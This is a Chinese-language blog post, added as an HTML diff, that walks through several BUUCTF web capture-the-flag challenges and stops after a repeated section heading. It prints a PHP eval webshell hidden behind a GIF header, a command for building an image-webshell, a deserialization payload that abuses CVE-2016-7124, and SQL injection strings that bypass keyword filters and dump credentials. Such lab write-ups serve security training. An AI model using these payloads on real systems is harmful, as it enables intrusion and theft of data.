@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="# 极客大挑战 2019 upload 关键词：php，phtml，过滤 &lt;?，文件上传 根据 Content-Type 判断图片：Content-Type: image&#x2F;png 过滤’&lt;?’，传 phtml 一句话木马 12GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&amp;#x27;shell&amp;#x27;]);&lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buuctf-web 武林秘籍">
+<meta property="og:url" content="http://example.com/2021/06/29/dmx/buuctf-web/index.html">
+<meta property="og:site_name" content="Milkii0的秘密花园">
+<meta property="og:description" content="# 极客大挑战 2019 upload 关键词：php，phtml，过滤 &lt;?，文件上传 根据 Content-Type 判断图片：Content-Type: image&#x2F;png 过滤’&lt;?’，传 phtml 一句话木马 12GIF89a&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&amp;#x27;shell&amp;#x27;]);&lt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web1.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web2.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web3.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web5.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web6.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web4.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web7.gif">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web7.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web11.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web8.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web9.png">
+<meta property="og:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web10.png">
+<meta property="article:published_time" content="2021-06-29T03:30:13.000Z">
+<meta property="article:modified_time" content="2021-07-04T01:56:55.301Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/06/29/dmx/buuctf-web/buuctf-web1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Buuctf-web 武林秘籍</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Milkii0的秘密花园" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/07/04/gallery/index/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/01/28/dmsj/webgoat%E5%AE%A1%E8%AE%A1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/29/dmx/buuctf-web/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/29/dmx/buuctf-web/&text=Buuctf-web 武林秘籍"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/29/dmx/buuctf-web/&is_video=false&description=Buuctf-web 武林秘籍"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Buuctf-web 武林秘籍&body=Check out this article: http://example.com/2021/06/29/dmx/buuctf-web/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/29/dmx/buuctf-web/&title=Buuctf-web 武林秘籍"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/29/dmx/buuctf-web/&name=Buuctf-web 武林秘籍&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/29/dmx/buuctf-web/&t=Buuctf-web 武林秘籍"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-upload"><span class="toc-number">1.</span> <span class="toc-text"> 极客大挑战 2019 upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-php"><span class="toc-number">2.</span> <span class="toc-text"> 极客大挑战 2019 php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9B-upload1"><span class="toc-number">3.</span> <span class="toc-text"> ACTF2020 新生赛 Upload1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-babysql1"><span class="toc-number">4.</span> <span class="toc-text"> 极客大挑战 2019 BabySQL1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9B-backupfile1"><span class="toc-number">5.</span> <span class="toc-text"> ACTF2020 新生赛 BackupFile1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9B-backupfile1-2"><span class="toc-number">6.</span> <span class="toc-text"> ACTF2020 新生赛 BackupFile1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hctf-2018-admin1"><span class="toc-number">7.</span> <span class="toc-text"> HCTF 2018 admin1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-buyflag"><span class="toc-number">8.</span> <span class="toc-text"> 极客大挑战 2019 BuyFlag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf2020-easy-md5"><span class="toc-number">9.</span> <span class="toc-text"> BJDCTF2020 Easy MD5</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Buuctf-web 武林秘籍
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-06-29T03:30:13.000Z" itemprop="datePublished">2021-06-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%A4%A7%E5%86%92%E9%99%A9/">大冒险</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="极客大挑战2019-upload"><a class="markdownIt-Anchor" href="#极客大挑战2019-upload">#</a> 极客大挑战 2019 upload</h2>
+<p><em>关键词：php，phtml，过滤 &lt;?，文件上传</em></p>
+<p>根据 Content-Type 判断图片：Content-Type: image/png</p>
+<p>过滤’&lt;?’，传 phtml 一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>phtml 简单来说就是将 php 嵌入 html 中</p>
+<p>(这题很诡异的是我上传一个正常图片，回显 Not Image)</p>
+<hr>
+<h2 id="极客大挑战2019-php"><a class="markdownIt-Anchor" href="#极客大挑战2019-php">#</a> 极客大挑战 2019 php</h2>
+<p><em>关键词：php 反序列化，网站备份，php 代码审计</em></p>
+<p>🎀网站备份文件名猜测，嫌麻烦直接上目录扫描，为 www.zip</p>
+<p>www.zip 中包含的文件主要为 index.php，class.php，flag.php</p>
+<p>🎀index.php 中关键代码片段如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>从 get 请求中获取’select’的值，再将该变量反序列化（其中变量前加 @是为了防止报错信息输出，导致信息泄露）</p>
+<p>🎀class.php 中 Name 对象：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">O:<span class="number">4</span><span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>从__destruct () 函数中的逻辑来看，只有当 password=100，username=admin 时，会输出 flag 的值</p>
+<p>__construct 构造函数会将我们传入的值赋值给变量 password 和 username，但是在反序列化后会调用__wakeup ()，将 username 赋值为 guest</p>
+<p><strong>CVE-2016-7124：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</strong></p>
+<p>👆👆👆通过上述漏洞可以跳过__wakeup () 的执行</p>
+<p>构造 exp.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>：&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;100&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>但是用 url 编码输出为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22100</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+<p>在 Nameusername，Namepassword 中，类名以及变量名前都存在不可见字符 %00</p>
+<p>因为 private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上 ascii 为 0 的字符 (不可见字符)</p>
+<p>⭐payload 需要修改的地方为成员变量个数，以及私有字段前增加 %00 (url 编码的不可见字符)</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;%00Name%00password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>总结</strong></p>
+<p>🌰<a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/">备份文件参考</a></p>
+<p>常见的网站源码备份文件后缀：tar、tar.gz、zip、rar</p>
+<p>常见的网站源码备份文件名：web、website、backup、back、www、wwwroot、temp</p>
+<p>🌰<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">php 魔术方法</a></p>
+<p>serialize () 时，若存在__sleep ()，会先调用__sleep ()，再执行序列化操作</p>
+<p>unserialize () 时，若存在__wakeup ()，反序列化后会调用__wakeup ()</p>
+<hr>
+<h2 id="actf2020-新生赛-upload1"><a class="markdownIt-Anchor" href="#actf2020-新生赛-upload1">#</a> ACTF2020 新生赛 Upload1</h2>
+<p><em>关键词：图片马</em></p>
+<p>🐴合成图片马命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 2.jpg/b + shell.php/a shell.jpg</span><br></pre></td></tr></table></figure>
+<p>上传 shell.jpg，抓包更改后缀名为 php，回显 nonono~ Bad file！</p>
+<p>更改后缀名为随机乱码字符，回显上传成功，目测设置黑名单</p>
+<p><img src="buuctf-web1.png" alt=""></p>
+<p>设置 phtml 后缀名，绕过成功</p>
+<p>shell.php：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;shell&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>合成图片马，上传改后缀，连 shell</p>
+<hr>
+<h2 id="极客大挑战-2019-babysql1"><a class="markdownIt-Anchor" href="#极客大挑战-2019-babysql1">#</a> 极客大挑战 2019 BabySQL1</h2>
+<p><em>关键词：sql 注入、过滤关键字、过滤特殊符号、字符拼接</em></p>
+<p>看题，登录框 sql 注入</p>
+<p>经测试，发现过滤字符：select，sleep，*，and，or，union…</p>
+<p>哈哈很多常用的嘛，不测了</p>
+<p><img src="buuctf-web2.png" alt=""></p>
+<p>考虑使用字符拼接绕过关键词检测，%2b 为’+‘url 编码，直接使用’+' 会被转成空格，payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="string">&#x27; an%2bd+slee%2bp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>
+<p>然后看着题目，发现过滤的关键字都置空的，双写也能绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="string">&#x27; anandd sleesleepp(10)--+&amp;password=111</span></span><br></pre></td></tr></table></figure>
+<p>打点到此结束⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐</p>
+<p>直接登录获得的并不是 flag，继续找 ，order by 发现为 3 个字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="string">&#x27; o%2brder b%2by 4--+&amp;password=111</span></span><br></pre></td></tr></table></figure>
+<p>回显的字段为 2，3</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p>爆表，从 information_schema.tables 中查找当前数据库所有表名，拼接在一起后在第二个字段输出</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,group_concat(table_name),3 fr%2bom info%2brmation_schema.tables whe%2bre ta%2bble_schema=database()--+</span></span><br></pre></td></tr></table></figure>
+<p>爆字段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,group_concat(column_name),3 fr%2bom info%2brmation_schema.columns whe%2bre ta%2bble_name=&#x27;</span>b4bsql<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello id,username,password！</span><br></pre></td></tr></table></figure>
+<p>然后发现两个表字段都是一样的，那找 b4bsql 中的数据吧</p>
+<p>拼接每行数据，并用 — 隔开</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span>admin<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">111</span><span class="string">&#x27; uni%2bon sele%2bct 1,group_concat(concat_ws(&#x27;</span><span class="comment">---&#x27;,username,passwo%2brd)),3 fr%2bom b4bsql--+</span></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<p><img src="buuctf-web3.png" alt=""></p>
+<p><strong>总结</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/apolloren/p/11002449.html">SQL 字符串拼接</a></p>
+<hr>
+<h2 id="actf2020-新生赛-backupfile1"><a class="markdownIt-Anchor" href="#actf2020-新生赛-backupfile1">#</a> ACTF2020 新生赛 BackupFile1</h2>
+<p><em>关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表</em></p>
+<p>看题，找备份文件，index.php.bak</p>
+<p>🐴index.php 代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);    &#125;    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;        <span class="keyword">echo</span> <span class="variable">$flag</span>;    &#125;&#125;<span class="keyword">else</span> &#123;    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>分析 1️⃣下，get 传递参数 key</p>
+<p>key 通过 is_numeric 判断是否为数字，再通过 intval 获取变量 key 的整数值</p>
+<p>最后如果变量 key==“123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”，输出 flag</p>
+<p>ヾ (｡｀Д´｡) 干嘛干嘛呢这是，气人</p>
+<p>ლ(╹◡╹ლ) 好了，百度完回来了</p>
+<p>is_numeric ()，可以将字符串转换成 16 进制，绕过判断（经常造成 sql 注入）</p>
+<p>intval ()，获取变量的整数值，默认为十进制</p>
+<p>==，弱类型比较，当字符串和数字进行比较时，只提取字符串中开头的整数部分</p>
+<p>⭐然后突然发现 str 是以 123 开头，弱类型比较是等于 123 的</p>
+<p>好了 payload：?key=123，成功拿到 flag</p>
+<p>…(＿ ＿) ノ｜壁</p>
+<hr>
+<h2 id="actf2020-新生赛-backupfile1-2"><a class="markdownIt-Anchor" href="#actf2020-新生赛-backupfile1-2">#</a> ACTF2020 新生赛 BackupFile1</h2>
+<p><em>关键词：is_numeric () 绕过，== 绕过，php 弱类型比较表</em></p>
+<p>看题，找备份文件，index.php.bak</p>
+<p>🐴index.php 代码如下：</p>
